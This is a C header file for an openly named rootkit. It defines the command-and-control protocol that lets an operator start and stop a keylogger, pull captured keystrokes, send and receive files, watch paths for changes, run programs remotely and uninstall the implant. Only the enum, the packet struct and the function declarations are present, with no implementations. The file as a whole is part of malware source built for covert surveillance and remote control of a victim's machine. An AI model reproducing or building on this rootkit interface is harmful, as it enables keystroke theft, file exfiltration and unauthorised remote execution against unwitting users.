#ifndef ROOTKIT_PROTOCOL_H
#define ROOTKIT_PROTOCOL_H

#include "utils/utils.h"

enum command_codes {
    START_KEYLOGGER = 0x09,
    STOP_KEYLOGGER,
    KEY_LOG_TRANSFER,
    SEND_FILE,
    RECEIVE_FILE,
    SEND_WATCH,
    WATCH_CHANGED,
    RUN_PROGRAM,
    UNINSTALL,
    DISCONNECT
};

struct packet_data {
    char data[2];
};


int handle_packet_data(struct packet_data packets[], int data);

// Keylogger
void send_start_keylogger(int fd);
void send_stop_keylogger(int fd);

// Disconnect
void send_disconnect(int fd);

// Transfer
enum FILE_TYPE {
    T_FILE,
    T_DIRECTORY
};

void send_file(struct client_options * client_options);
void receive_file(int fd);
void send_watch(int fd, enum FILE_TYPE file_type, char * path);


// Run program
void send_run_program(int fd);


// Uninstall
void send_uninstall(int fd);




#endif //ROOTKIT_PROTOCOL_H